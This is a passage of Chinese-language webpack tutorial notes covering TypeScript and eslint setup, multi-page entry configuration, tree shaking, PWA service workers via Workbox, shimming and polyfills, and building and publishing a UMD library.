workder。\nTypescript\n在前端生态里，TS扮演着越来越重要的角色。我们直入正题，讲下如何在webpack工程化环境中集成TS。首先，当然是安装我们的ts和对应的loader。npm install –save-dev typescript ts-loader\n接下来我们需要在项目根目录下添加一个ts的配置文件————tsconfig.json，我们可以用ts自带的工具来自动化生成它。npx tsc –init我们发现生成了一个tsconfig.json，里面注释掉了绝大多数配置。现在，根据我们想要的效果来打开对应的配置。\n&#123; &quot;compilerOptions&quot;: &#123;  &quot;outDir&quot;: &quot;./dist/&quot;,  &quot;noImplicitAny&quot;: true,  &quot;sourceMap&quot;: true,  &quot;module&quot;: &quot;es6&quot;,  &quot;target&quot;: &quot;es5&quot;,  &quot;jsx&quot;: &quot;react&quot;,  &quot;allowJs&quot;: true,  &quot;moduleResolution&quot;: &quot;node&quot; &#125;&#125; const path = require(&#x27;path&#x27;); module.exports = &#123; entry: &#x27;./src/index.ts&#x27;, devtool: &#x27;inline-source-map&#x27;,千\n好了，接下来我们新增一个src&#x2F;index.ts，内置一些内容。然后我们别忘了更改我们的entry及配置对应的loder。当然，还有resolve.extensions，将.ts放在.js之前，这样它会先找.ts。注意，如果我们使用了sourceMap，一定记得和上面的ts配置一样，设置sourcemap为true。也别忘记在我们的webpack.config.js里，添加sourcemap,就像我们之前课程里讲的那样。更改如下：\nconst path = require(&#x27;path&#x27;); module.exports = &#123; entry: &#x27;./src/index.ts&#x27;, devtool: &#x27;inline-source-map&#x27;,  module: &#123;   rules: [   &#123;     test: /\\.(ts|tsx)$/,     use: &#x27;ts-loader&#x27;,     exclude: /node_modules/,   &#125;,  ], &#125;,  resolve: &#123;   extensions: [ &#x27;.tsx&#x27;, &#x27;.ts&#x27;, &#x27;.js&#x27; ], &#125;,  output: &#123;   filename: &#x27;bundle.js&#x27;,   path: path.resolve(__dirname, &#x27;dist&#x27;), &#125;,&#125;;\n\n运行我们的项目，我们发现完全没有问题呢！使用第三方类库在从 npm 上安装第三方库时，一定要记得同时安装这个库的类型声明文件(typingdefinition)。我们可以从 TypeSearch中找到并安装这些第三方库的类型声明文件(https://www.typescriptlang.org&#x2F;dt&#x2F;search?search&#x3D;) 。举个例子，如果想安装 lodash 类型声明文件，我们可以运行下面的命令：npm install –save-dev @types&#x2F;lodash\neslint &amp; ts注意，如果要使用eslint，使用初始化命令的时候，记得选择“使用了typesctipt”。如果已经配置了eslint，但没有配置ts相关的配置，那么我们需要先安装对应的plugin注意如果需要用到react的话，记得也要安装\nyarn add -D  @typescript-eslint&#x2F;eslint-plugin@latest\nvue或者其他常用框架同样如此，一般都会有专门的plugin。然后我们队.esilntrc进行更改~\n&#123;  &quot;env&quot;: &#123;    &quot;browser&quot;: true,    &quot;es2021&quot;: true &#125;,  &quot;extends&quot;: [    &quot;eslint:recommended&quot;, // 如果需要react的话    &quot;plugin:react/recommended&quot;,    &quot;plugin:@typescript-eslint/recommended&quot; ],  &quot;parser&quot;: &quot;@typescript-eslint/parser&quot;,  &quot;parserOptions&quot;: &#123;    &quot;ecmaFeatures&quot;: &#123;      &quot;jsx&quot;: true   &#125;, // 如果需要react的话    &quot;ecmaVersion&quot;: 13,    &quot;sourceType&quot;: &quot;module&quot; &#125;,  &quot;plugins&quot;: [    &quot;react&quot;,    &quot;@typescript-eslint&quot; ],  &quot;rules&quot;: &#123;   // ...一些自定义的rules    &quot;no-console&quot;: &quot;error&quot; &#125;&#125;;\n执行npm run eslint试一下！\n四.多页面应用entry配置在实际项目的开发中一个完整的系统不会将所有的功能都放在一个网页上，因为这样会导致网页的性能不佳，实际可以按照功能模块划分多个单页应用每个单页应用又生处一个html文件并且随着业务的发展更多的单页应用可以被逐渐的加入到这个项目里。\nentry: [&#x27;./src/file_1.js&#x27;, &#x27;./src/file_2.js&#x27;，&#x27;node_modules里的模块 lodash&#x27;],entry:&#123;\tmain:[&#x27;./src/file_1.js&#x27;, &#x27;./src/file_2.js&#x27;],    //这里使用lodash  还会打包在这里打包一遍\tlodash:&#x27;lodash&#x27;,&#125;entry:&#123;\tmain:&#123;\timport :[&#x27;./src/file_1.js&#x27;, &#x27;./src/file_2.js&#x27;],  //这两个文件可能依赖于lodash，而lodash单独打包了，所以dependOn这个依赖可以把公共的lodash给抽离出来            lodash  就不会在打包一遍了\tdependOn:&#x27;lodash&#x27;,           // 做依赖  这里的lodash  是下面的对应名  可以随意起\t&#125;,    //这里使用lodash  还会打包在这里打包一遍\tlodash:&#x27;lodash&#x27;,&#125;\n对象语法会比较繁琐。然而，这是应用程序中定义入口的最可扩展的方式。描述入口的对象：用于描述入口的对象。你可以使用如下属性：dependOn : 当前入口所依赖的入口。它们必须在该入口被加载前被加载。filename : 指定要输出的文件名称。import : 启动时需加载的模块。library : 指定 library 选项，为当前 entry 构建一个 library。runtime : 运行时 chunk 的名字。如果设置了，就会创建一个新的运行时chunk。在 webpack 5.43.0 之后可将其设为 false 以避免一个新的运行时chunk。publicPath : 当该入口的输出文件在浏览器中被引用时，为它们指定一个公共URL 地址。请查看 output.publicPath。webpack.config.jsruntime 和 dependOn 不应在同一个入口上同时使用，所以如下配置无效，并且会抛出错误：\nmodule.exports = &#123; entry: &#123;  a2: &#x27;dependingfile.js&#x27;,  b2: &#123;   dependOn: &#x27;a2&#x27;,   import: &#x27;./src/app.js&#x27;, &#125;,&#125;,&#125;;\nwebpack.config.js\nmodule.exports = &#123; entry: &#123;  a2: &#x27;./a&#x27;,  b2: &#123;   runtime: &#x27;x2&#x27;,   dependOn: &#x27;a2&#x27;,   import: &#x27;./b&#x27;, &#125;,&#125;,&#125;;\n确保 runtime 不能指向已存在的入口名称，例如下面配置会抛出一个错误：\nmodule.exports = &#123; entry: &#123;  a1: &#x27;./a&#x27;,  b1: &#123;   runtime: &#x27;a1&#x27;,   import: &#x27;./b&#x27;, &#125;,&#125;,&#125;;\n另外 dependOn 不能是循环引用的，下面的例子也会出现错误\nmodule.exports = &#123; entry: &#123;  a3: &#123;   import: &#x27;./a&#x27;,   dependOn: &#x27;b3&#x27;, &#125;,  b3: &#123;   import: &#x27;./b&#x27;,   dependOn: &#x27;a3&#x27;, &#125;,&#125;,&#125;;\n\n配置index.html模板要生成多个HTML文件，请在插件数组中多次声明插件。\n&#123; entry: &#123; \tmain:&#123;\t\timport :[],\t\tdependOn:&#x27;lodash2&#x27;,\t\tfilename:&#x27;chanel1.[name].js&#x27;\t&#125;,\tlodash2:&#123;\t\timport :&#x27;lodash&#x27;,\t\tfilename:&#x27;common/[name].js&#x27;\t&#125; &#125;, plugins: [  new HtmlWebpackPlugin(), // Generates default index.html  new HtmlWebpackPlugin(&#123;  // Also generate a test.html   title:   &#x27;ejs&#x27;,     //在页面可以使用ejs模板语法获取数据   filename: &#x27;chanel1/test.html&#x27;,                      //执行打包后的页面文件     输出的文件名   template: &#x27;src/assets/test.html&#x27;       //指定模板的路径   inject:&#x27;body/head&#x27;,                       // 定义当前所生成的script标签的位置   chunks:[&#x27;自定义那个入口  如：main.js&#x27;]，              //规定当前页面到底打包那些chunk   如何实现多个页面去载入不同的chunk   chunk就是我们在路口配置的项    每一项就是一个chunk  默认会把所有chunk都放进去   publicPash:&#x27;http://www.a.com/&#x27;        //包的前缀 &#125;) ]&#125;&lt;title&gt;&lt;%= htmlWebpackPlugin.options.title  %&gt;&lt;/title&gt;  options.就是我们在HtmlWebpackPlugin定制的选项index.html&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt;  &lt;meta charset=&quot;utf-8&quot;/&gt;  &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;\n\n多页面应用\nmodule.exports = &#123; entry: &#123;  pageOne: &#x27;./src/pageOne/index.js&#x27;,  pageTwo: &#x27;./src/pageTwo/index.js&#x27;,  pageThree: &#x27;./src/pageThree/index.js&#x27;,&#125;,&#125;;\n这是什么？ 我们告诉 webpack 需要三个独立分离的依赖图（如上面的示例）\n为什么？ 在多页面应用程序中，server 会拉取一个新的 HTML 文档给你的客户端。页面重新加载此新文档，并且资源被重新下载。然而，这给了我们特殊的机会去做很多事，例如使用 optimization.splitChunks 为页面间共享的应用程序代码创建bundle。由于入口起点数量的增多，多页应用能够复用多个入口起点之间的大量代码&#x2F;模块，从而可以极大地从这些技术中受益。\n五.Tree Shakingtree shaking 是一个术语，通常用于描述移除 JavaScript 上下文中的未引用代码(dead-code)。它依赖于 ES2015 模块语法的 静态结构 特性，例如 import 和export 。这个术语和概念实际上是由 ES2015 模块打包工具 rollup 普及起来的。webpack 2 正式版本内置支持 ES2015 模块（也叫做 harmony modules）和未使用模块检测能力。新的 webpack4 正式版本扩展了此检测能力，通过 package.json的 “sideEffects” 属性作为标记，向 compiler 提供提示，表明项目中的哪些文件是 “pure(纯正 ES2015 模块)”，由此可以安全地删除文件中未使用的部分\noptimization: &#123; usedExports: true,&#125;,\nwebpack5打包更加精简化           只打包用到的方法或属性      tree shaking  优化到了极质，把一些没有用的代码全部摇掉只是给我们用到了的数据理论：只要是我认为这个代码在项目中没有使用  那么就给摇掉。它基于es  module\nsideEffects注意 Webpack 不能百分百安全地进行 tree-shaking。有些模块导入，只要被引入，就会对应用程序产生重要的影响。一个很好的例子就是全局样式表，或者设置全局配置的JavaScript 文件。\nWebpack 认为这样的文件有“副作用”。具有副作用的文件不应该做 tree-shaking，因为这将破坏整个应用程序。Webpack 的设计者清楚地认识到不知道哪些文件有副作用的情况下打包代码的风险，因此webpack4默认地将所有代码视为有副作用。这可以保护你免于删除必要的文件，但这意味着 Webpack 的默认行为实际上是不进行 tree-shaking。值得注意的是webpack5默认会进行 tree-shaking。如何告诉 Webpack 你的代码无副作用，可以通过 package.json 有一个特殊的属性sideEffects，就是为此而存在的。它有三个可能的值：true如果不指定其他值的话。这意味着所有的文件都有副作用，也就是没有一个文件可以 tree-shaking。false告诉 Webpack 没有文件有副作用，所有文件都可以 tree-shaking。数组[…]\npackage.json&#x27;sideEffects&#x27;:true/false,&#x27;sideEffects&#x27;:[&#x27;*.css&#x27;,&#x27;*.global.js&#x27;],\n是文件路径数组。它告诉 webpack，除了数组中包含的文件外，你的任何文件都没有副作用。因此，除了指定的文件之外，其他文件都可以安全地进行 tree-shaking。webpack4 曾经不进行对 CommonJs 导出和 require() 调用时的导出使用分析。webpack 5 增加了对一些 CommonJs 构造的支持，允许消除未使用的 CommonJs导出，并从 require() 调用中跟踪引用的导出名称。\n六.渐进式网络应用程序PWA渐进式网络应用程序(progressive web application - PWA)，是一种可以提供类似于native app(原生应用程序) 体验的 web app(网络应用程序)，就是说我们在浏览器端能够实现类似于原生应用程序的体验。PWA 可以用来做很多事。其中最重要的是，在离线(offline)时应用程序能够继续运行功能。这是通过使用名为 Service Workers 的 web 技术来实现的。\n非离线环境下运行\n到目前为止，我们一直是直接查看本地文件系统的输出结果。通常情况下，真正的用户是通过网络访问 web app；用户的浏览器会与一个提供所需资源（例如， .html ,.js 和 .css 文件）的 server 通讯。我们通过搭建一个拥有更多基础特性的 server 来测试下这种离线体验。这里使用http-server package： npm install http-server –save-dev 。还要修改package.json 的 scripts 部分，来添加一个 start script：\n不使用webpack-dev-server，使用第三方server，相当于我们把dist已经打包出来准备发布了npm install http-server -D\n&#123; ... &quot;scripts&quot;: &#123;  &quot;start&quot;: &quot;http-server dist&quot;&#125;, ...&#125;//注意：webpack-dev-server 是一个非离线 在线的server。 默认情况下，webpack DevServer 会写入到内存（当我们修改代码的时候重新启动服务它并不能够把我们的文件打包到dist下面，因为他是直接放到内存里的。）。我们需要启用devserverdevmiddleware.writeToDisk 配置项，来让 http-server 处理 ./dist 目录中的文件。\ndevServer: &#123; devMiddleware: &#123;    //开发环境的server的中间件  writeToDisk:true,    // 写入到硬盘里  index: true,  writeToDisk: true,&#125;,&#125;\n如果你打开浏览器访问 http://localhost:8080 (即 http://127.0.0.1 )，你应该会看到 webpack 应用程序被 serve 到 dist 目录。如果停止 server 然后刷新，则 webpack 应用程序不再可访问。这就是我们为实现离线体验所需要的改变。在本章结束时，我们应该要实现的是，停止 server 然后刷新，仍然可以看到应用程序正常运行。\n添加 Workbox添加 workbox-webpack-plugin 插件，然后调整 webpack.config.js 文件：    实现PWAnpm install workbox-webpack-plugin –save-dev\nconst path = require(&#x27;path&#x27;);const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;);const WorkboxPlugin = require(&#x27;workbox-webpack-plugin&#x27;);module.exports = &#123; entry: &#123;  app: &#x27;./src/index.js&#x27;,&#125;, plugins: [  new HtmlWebpackPlugin(),  new WorkboxPlugin.GenerateSW(&#123;   // 这些选项帮助快速启用 ServiceWorkers   // 不允许遗留任何“旧的” ServiceWorkers   clientsClaim: true,  // 快速的启用ServiceWorkers   skipWaiting: true,     // 跳出等待 &#125;),], output: &#123;  filename: &#x27;[name].bundle.js&#x27;,  path: path.resolve(__dirname, &#x27;dist&#x27;),  clean: true,&#125;,&#125;&#125;\n现在你可以看到，生成了两个额外的文件： service-worker.js 和名称冗长的workbox-718aa5be.js 。 service-worker.js 是 Service Worker 文件， workbox-718aa5be.js 是 service-worker.js 引用的文件，所以它也可以运行。你本地生成的文件可能会有所不同；但是应该会有一个 service-worker.js 文件。所以，值得高兴的是，我们现在已经创建出一个 Service Worker。接下来该做什么？\n注册 Service Worker  实现离线浏览页面的功能接下来我们注册 Service Worker，使其出场并开始表演。通过添加以下注册代码来完成此操作：index.js\nif (&#x27;serviceWorker&#x27; in navigator) &#123;    //浏览器是否支持serviceWorker window.addEventListener(&#x27;load&#x27;, () =&gt; &#123;   //绑定事件load在页面加载完之后执行  navigator.serviceWorker.register(&#x27;/service-     // 方法传入刚刚打包好的service-worker.js。worker.js&#x27;).then(registration =&gt; &#123;                  // 拿到注册以后的成功的结果   console.log(&#x27;SW 注册成功: &#x27;, registration); &#125;).catch(registrationError =&gt; &#123;   console.log(&#x27;SW 注册失败: &#x27;, registrationError); &#125;);&#125;);&#125;\n相当于在浏览器里我们的页面被缓存下来了chrome:&#x2F;&#x2F;serviceworker-internals    清除http-server缓存。   服务就跑不起来了。\n再次运行 npx webpack 来构建包含注册代码版本的应用程序。然后用 npm start启动服务。访http://localhost:8080并查看 console 控制台。在那里你应该看到：SW registered现在来进行测试。停止 server 并刷新页面。如果浏览器能够支持 Service Worker，应该可以看到你的应用程序还在正常运行。然而，server 已经停止 serve 整个 dist文件夹，此刻是 Service Worker 在进行 serve。\n七.Shimming预置依赖不导入直接就可以使用一些变量\nwebpack compiler 能够识别遵循 ES2015 模块语法、CommonJS 或 AMD 规范编写的模块。然而，一些 third party(第三方库) 可能会引用一些全局依赖（例如 jQuery中的 $ ）。因此这些 library 也可能会创建一些需要导出的全局变量这些 “brokenmodules(不符合规范的模块)” 就是 shimming(预置依赖) 发挥作用的地方。shim 另外一个极其有用的使用场景就是：当你希望 polyfill 扩展浏览器能力，来支持到更多用户时。在这种情况下，你可能只是想要将这些 polyfills 提供给需要修补(patch)的浏览器（也就是实现按需加载）。\nShimming 预置全局变量\n让我们开始第一个 shimming 全局变量的用例。还记得我们之前用过的 lodash吗？出于演示目的，例如把这个应用程序中的模块依赖，改为一个全局变量依赖。要实现这些，我们需要使用 ProvidePlugin 插件。使用 ProvidePlugin 后，能够在 webpack 编译的每个模块中，通过访问一个变量来获取一个 package。如果 webpack 看到模块中用到这个变量，它将在最终bundle 中引入给定的 package。让我们先移除 lodash 的 import 语句，改为通过插件提供它：src&#x2F;index.js\nconsole.log(_.join([&#x27;hello&#x27;, &#x27;webpack&#x27;], &#x27; &#x27;))webpack.config.jsconst webpack = require(&#x27;webpack&#x27;)module.exports = &#123; mode: &#x27;development&#x27;, entry: &#x27;./src/index.js&#x27;, plugins: [  new webpack.ProvidePlugin(&#123;   _: &#x27;lodash&#x27;     // lodash变成全局  遇到_将lodash包引进来 &#125;)]&#125;\n我们本质上所做的，就是告诉 webpack……如果你遇到了至少一处用到 _ 变量的模块实例，那请你将 lodash package 引入进来，并将其提供给需要用到它的模块。运行我们的构建脚本，将会看到同样的输出：\n[felix] 01-third-party-shimming $ npx webpackasset main.js 549 KiB [emitted] (name: main)runtime modules 344 bytes 2 modulescacheable modules 528 KiB./src/index.js 46 bytes [built] [code generated]../../../../../node_modules/lodash/lodash.js 528 KiB [built][code generated]webpack 5.61.0 compiled successfully in 275 ms\n还可以使用 ProvidePlugin 暴露出某个模块中单个导出，通过配置一个“数组路径”（例如 [module, child, …children?] ）实现此功能。所以，我们假想如下，无论 join 方法在何处调用，我们都只会获取到 lodash 中提供的 join 方法。\nsrc/index.jsconsole.log(join([&#x27;hello&#x27;, &#x27;webpack&#x27;], &#x27; &#x27;))webpack.config.jsconst webpack = require(&#x27;webpack&#x27;)module.exports = &#123; mode: &#x27;development&#x27;, entry: &#x27;./src/index.js&#x27;, plugins: [  new webpack.ProvidePlugin(&#123;   // _: &#x27;lodash&#x27;   join: [&#x27;lodash&#x27;, &#x27;join&#x27;], &#125;)]&#125;\n这样就能很好的与 tree shaking 配合，将 lodash library 中的其余没有用到的导出去除\n细粒度 Shimming一些遗留模块依赖的 this 指向的是 window 对象。在接下来的用例中，调整我们的 index.js ：npm istall imports-loader -D\nthis.alert(&#x27;hello webpack&#x27;)\n当模块运行在 CommonJS 上下文中，这将会变成一个问题，也就是说此时的 this指向的是 module.exports 。在这种情况下，你可以通过使用 imports-loader 覆盖 this 指向：\nconst webpack = require(&#x27;webpack&#x27;)const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)module.exports = &#123; mode: &#x27;production&#x27;, entry: &#x27;./src/index.js&#x27;, module: &#123;  rules: [  &#123;    test: require.resolve(&#x27;./src/index.js&#x27;),     // 调用require.resolve去调用  文件。    use: &#x27;imports-loader?wrapper=window&#x27;,     //webpack解析到  这个文件时使用的loader  wrapper=window  指明包里面的this指向浏览器的window。  &#125;, ]&#125;, plugins: [  new webpack.ProvidePlugin(&#123;   _: &#x27;lodash&#x27; &#125;),  new HtmlWebpackPlugin()]&#125;\n\n全局 Exports\n让我们假设，某个 library 创建出一个全局变量，它期望 consumer(使用者) 使用这个变量。为此，我们可以在项目配置中，添加一个小模块来演示说明：\nsrc/globals.jsconst file = &#x27;example.txt&#x27;;const helpers = &#123; test: function () &#123;  console.log(&#x27;test something&#x27;)&#125;, parse: function () &#123;  console.log(&#x27;parse something&#x27;)&#125;,&#125;npm install exports-loader -Dwebpack.config.jsconst webpack = require(&#x27;webpack&#x27;)const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)module.exports = &#123; mode: &#x27;production&#x27;, entry: &#x27;./src/index.js&#x27;, module: &#123;  rules: [  &#123;    test: require.resolve(&#x27;./src/index.js&#x27;),    use: &#x27;imports-loader?wrapper=window&#x27;,  &#125;,  &#123;    test: require.resolve(&#x27;./src/globals.js&#x27;),    use: &#x27;exports-loader?type=commonjs&amp;exports=file,multiple|helpers.parse（value）|parse（key）&#x27;,   //  type：类型为模块导出的类型commonjs    导出的变量file  js文件中的File    ，multiple表示导出一个key|value的形式。  &#125;, ]&#125;, plugins: [  new webpack.ProvidePlugin(&#123;   _: &#x27;lodash&#x27; &#125;),  new HtmlWebpackPlugin()]&#125;const &#123;file,parse&#125; = require(&#x27;./globals&#x27;)   //  那我直接导入不就行了，前提条件globals.js是外部的一个文件，一般情况下我们并不知道它是如何导出的   所有我们在配置文件里边做一个  一些内容的导出   这样我们就可以单独的去使用我们想要的一些模块了\n\n此时，在我们的 entry 入口文件中（即 src&#x2F;index.js ），可以使用 const {file, parse } &#x3D; require(‘.&#x2F;globals.js’); ，可以保证一切将顺利运行。\n加载 Polyfills目前为止，我们讨论的所有内容 都是处理那些遗留的 package，让我们进入到第二个话题：polyfill。有很多方法来加载 polyfill。例如，想要引入 @babel&#x2F;polyfill 我们只需如下操作：npm install –save @babel&#x2F;polyfill然后，使用 import 将其引入到我们的主 bundle 文件：\nindex.jsimport &#x27;@babel/polyfill&#x27;    //polyfill俗称垫片   在执行下面的语句之前，把所有的可能需要降级的代码都放在了我们代码的前面console.log(Array.from([1, 2, 3], x =&gt; x + x))    //from方法不是所有的浏览器都支持的   如果是我们不告诉webpack那么他就纯粹八Array.from直接的打到我们的页面上去了，即使是我们可能会使用一些@babal/loader,但是他也不会  100%的将我们的代码全部转换为低版本的浏览器能够识别的所有代码。所以我们得告诉浏览器 在某些版本里面得把他转成低版本的代码比如  es6=&gt;es3.1  这是我们就需要一个垫片来完成。\n注意，这种方式优先考虑正确性，而不考虑 bundle 体积大小。为了安全和可靠，polyfill&#x2F;shim 必须运行于所有其他代码之前，而且需要同步加载，或者说，需要在所有 polyfill&#x2F;shim 加载之后，再去加载所有应用程序代码。 社区中存在许多误解，即现代浏览器“不需要”polyfill，或者 polyfill&#x2F;shim 仅用于添加缺失功能 - 实际上，它们通常用于修复损坏实现(repair broken implementation)，即使是在最现代的浏览器中，也会出现这种情况。 因此，最佳实践仍然是，不加选择地和同步地加载所有polyfill&#x2F;shim，尽管这会导致额外的 bundle 体积成本。\n进一步优化 Polyfills不建议使用 import @babel&#x2F;polyfilll 。因为这样做的缺点是会全局引入整个polyfill包，比如 Array.from 会全局引入，不但包的体积大，而且还会污染全局环境。babel-preset-env package 通过 browserslist 来指定来对那些浏览器那些浏览器的版本进行转换，来转译那些你浏览器中不支持的特性。这个 preset 使用 useBuiltIns 选项，默认值是 false ，这种方式可以将全局babel-polyfill 导入，改进为更细粒度的 import 格式：\nimport &#x27;core-js/modules/es7.string.pad-start&#x27;;import &#x27;core-js/modules/es7.string.pad-end&#x27;;import &#x27;core-js/modules/web.timers&#x27;;import &#x27;core-js/modules/web.immediate&#x27;;import &#x27;core-js/modules/web.dom.iterable&#x27;;\n&#x2F;&#x2F;安装 @babel&#x2F;preset-env 及 相关的包npm i babel-loader @babel&#x2F;core @babel&#x2F;preset-env -D&#x2F;&#x2F; webpack.config.jsconst HtmlWebpackPlugin &#x3D; require(‘html-webpack-plugin’)module.exports &#x3D; { mode: ‘production’, entry: ‘.&#x2F;src&#x2F;index.js’, plugins: [  new HtmlWebpackPlugin()], module: {  rules: [  {    test: &#x2F;.js$&#x2F;,    exclude: &#x2F;node_modules&#x2F;,    use: {     loader: ‘babel-loader’,     options: {      presets: [      [        ‘@babel&#x2F;preset-env’,       {         targets: [  &#x2F;&#x2F;也可以顶知道package.json中  符合这个条件的代码都需要通过Polyfill来进行垫片的添加          “last 1 version”,          “&gt; 1%”,         ],         useBuiltIns: ‘usage’ ，    &#x2F;&#x2F;  这里这个@babel&#x2F;preset-env  后我们就不需要手动的导入  import ‘@babel&#x2F;polyfill’了。        使用这个选项需要 Core.js翻译器，这是优雅降级的一些库         &#x2F;&#x2F;添加corejs配置           corejs: 3,     &#x2F;&#x2F;定义core.js的版本魏三       }      ]     ]    }   }  } ]}}useBuiltIns: 参数有 “entry”、”usage”、false 三个值默认值是 false ，此参数决定了babel打包时如何处理@babel&#x2F;polyfilll 语句。“entry”: 会将文件中 import @babel&#x2F;polyfilll 语句 结合 targets ，转换为一系列引入语句，去掉目标浏览器已支持的 polyfilll 模块，不管代码里有没有用到，只要目标浏览器不支持都会引入对应的 polyfilll 模块。“usage”: 不需要手动在代码里写 import @babel&#x2F;polyfilll ，打包时会自动根据实际代码的使用情况，结合 targets 引入代码里实际用到部分 polyfilll 模块false: 对 import‘@babel&#x2F;polyfilll’不作任何处理，也不会自动引入 polyfilll 模块。需要注意的是在 webpack 打包文件配置的 entry 中引入的 @babel&#x2F;polyfill 不会根据useBuiltIns 配置任何转换处理。\n由于@babel&#x2F;polyfill在7.4.0中被弃用，我们建议直接添加corejs并通过corejs选项设置版本。执行编译 npx webpack\n[felix] 02-polyfill $ npx webpackWARNING (@babel/preset-env): We noticed you&#x27;re using the`useBuiltIns` option without declaring a core-js version.Currently, we assume version 2.x when no version is passed. Sincethis default version will likely change in future versions ofBabel, we recommend explicitly setting the core-js version youare using via the `corejs` option.You should also be sure that the version you pass to the `corejs`option matches the version specified in your `package.json`&#x27;s`dependencies` section. If it doesn&#x27;t, you need to run one of thefollowing commands:npm install --save core-js@2   npm install --save core-js@3yarn add core-js@2       yarn add core-js@3More info about useBuiltIns: https://babeljs.io/docs/en/babel-preset-env#usebuiltinsMore info about core-js: https://babeljs.io/docs/en/babel-preset-env#corejsasset main.js 16.7 KiB [emitted] [minimized] (name: main)asset index.html 214 bytes [compared for emit]runtime modules 663 bytes 3 modulesmodules by path ./node_modules/core-js/modules/*.js 38.9 KiB 68modules./src/index.js 374 bytes [built] [code generated]webpack 5.61.0 compiled successfully in 1613 ms\n提示我们需要安装 core-js 。npm i core-js@3 -S此时还需要 添加一个配置：&#x2F;&#x2F; 添加corejs配置corejs: 3,成功优化\n八.创建 library除了打包应用程序，webpack 还可以用于打包 JavaScript library。例如：当我们想要自己开发一个组件库工具或者框架的时候也就是说我们自己造一个轮子给别人用的时候我们免不了要开发很多的模块，最终都可以请webpack来帮我们打包。\n创建一个 library假设我们正在编写一个名为 webpack-numbers 的小的 library，可以将数字 1 到 5转换为文本表示，反之亦然，例如将 2 转换为 ‘two’。使用 npm 初始化项目，然后安装 webpack ， webpack-cli 和 lodash ：\nnpm i webpack webpack-cli lodash -D\n我们将 lodash 安装为 devDependencies 而不是 dependencies ，因为我们不需要将其打包到我们的库中，否则我们的库体积很容易变大。\nsrc&#x2F;ref.json\n[&#123;  &quot;num&quot;: 1,  &quot;word&quot;: &quot;One&quot;&#125;,&#123;  &quot;num&quot;: 2,  &quot;word&quot;: &quot;Two&quot;&#125;,&#123;  &quot;num&quot;: 3,  &quot;word&quot;: &quot;Three&quot;&#125;,&#123;  &quot;num&quot;: 4,  &quot;word&quot;: &quot;Four&quot;&#125;,&#123;  &quot;num&quot;: 5,  &quot;word&quot;: &quot;Five&quot;&#125;,&#123;  &quot;num&quot;: 0,  &quot;word&quot;: &quot;Zero&quot;&#125;]\nsrc&#x2F;index.js\nimport _ from &#x27;lodash&#x27;;import numRef from &#x27;./ref.json&#x27;;export function numToWord(num) &#123; return _.reduce(  numRef, (accum, ref) =&gt; &#123;   return ref.num === num ? ref.word : accum; &#125;,  &#x27;&#x27;);&#125;export function wordToNum(word) &#123; return _.reduce(  numRef, (accum, ref) =&gt; &#123;   return ref.word === word &amp;&amp; word.toLowerCase() ? ref.num :accum; &#125;,  -1);&#125;\n\nconst path = require(&#x27;path&#x27;);module.exports = &#123; mode:&#x27;production&#x27;, entry: &#x27;./src/index.js&#x27;, output: &#123;  path: path.resolve(__dirname, &#x27;dist&#x27;),  filename: &#x27;webpack-numbers.js&#x27;,  library:&#123;    name:&#x27;webpackNumbers&#x27;,\ttype&#x27;umd&#x27;  &#125;,  globalObject:&#x27;globalThis&#x27;&#125;, externals:&#123; \tlodash:&#123;   lodash  引入包的名字\t\tcommonjs:&#x27;lodash&#x27;,   //  兼容引入形式\t\tcommonjs2:&#x27;lodash&#x27;,\t\tamd:&#x27;lodash&#x27;,\t\troot:&#x27;_&#x27;\t&#125; &#125;&#125;;\n\n发布到线上拥有npm账号npm config get registry   &#x2F;&#x2F; 一定要保证本地的registry的地址是https://registry.npmjs.org/    因为这样的话才是真正的连接到npm官网的地址上   有些人可能是淘宝  那么就访问不上去了npm adduser  &#x2F;&#x2F;添加用户   输入用户名密码包的名字必须是全球唯一的。   npm publish    上传时package.json中的main入口必须对应：dist&#x2F;文件名   因为别人通过 require去载入包的时候  会读取 这个main这是的暴露的包的名字npm install 包名就可以下载了\nWebpack 配置\nwebpack.config.js\noutput:&#123;\tpath:&#x27;&#x27;,\tfilname:&#x27;&#x27;,\tlibrary:&#x27;&#x27;,    //我们只是定义了导出 并且没有使用它  所以webpack认为这个代码是没有用的。   如何让他作为一个library来进行一个对外的打包   让代码不被 Webpack Tree shaking   配置 library:&#x27;包的名字&#x27;&#125;\n\n到目前为止，一切都应该与打包应用程序一样，这里是不同的部分 - 我们需要通过output.library 配置项暴露从入口导出的内容。我们暴露了 webpackNumbers ，以便用户可以通过 script 标签使用。\t\n&lt;script src=&quot;https://example.org/webpack-numbers.js&quot;&gt;&lt;/script&gt;&lt;script&gt; window.webpackNumbers.wordToNum(&#x27;Five&#x27;);&lt;/script&gt;\n\n然而它只能通过被 script 标签引用而发挥作用，它不能运行在 CommonJS、AMD、Node.js 等环境中。作为一个库作者，我们希望它能够兼容不同的环境，也就是说，用户应该能够通过以下方式使用打包后的库：CommonJS module require:\nconst webpackNumbers = require(&#x27;webpack-numbers&#x27;);// ...webpackNumbers.wordToNum(&#x27;Two&#x27;);\nAMD module require:\nrequire([&#x27;webpackNumbers&#x27;], function (webpackNumbers) &#123; // ... webpackNumbers.wordToNum(&#x27;Two&#x27;);&#125;);\nscript tag:\n&lt;!DOCTYPE html&gt;&lt;html&gt;... &lt;script src=&quot;https://example.org/webpack-numbers.js&quot;&gt;&lt;/script&gt; &lt;script&gt;  // ...  // Global variable  webpackNumbers.wordToNum(&#x27;Five&#x27;);  // Property in the window object  window.webpackNumbers.wordToNum(&#x27;Five&#x27;);  // ... &lt;/script&gt;&lt;/html&gt;\n\n我们更新 output.library 配置项，将其 type 设置为 ‘umd’ ：\nconst path = require(&#x27;path&#x27;);module.exports = &#123; entry: &#x27;./src/index.js&#x27;, output: &#123;  path: path.resolve(__dirname, &#x27;dist&#x27;),  filename: &#x27;webpack-numbers.js&#x27;,  library: &#123;   name: &#x27;webpackNumbers&#x27;,   type: &#x27;umd&#x27;,   //  window&#x27;(es module)   &#x27;commonjs&#x27;   &#x27;module&#x27; 它在experiments:&#123;outputModule:true&#125;才能使用，他是一个实验性的功能，就不需要这个name了。&lt;script type=&quot;module&quot;&gt;    &#x27;umd&#x27;支持所有的类型。  esmodule 有问题  &#125;,  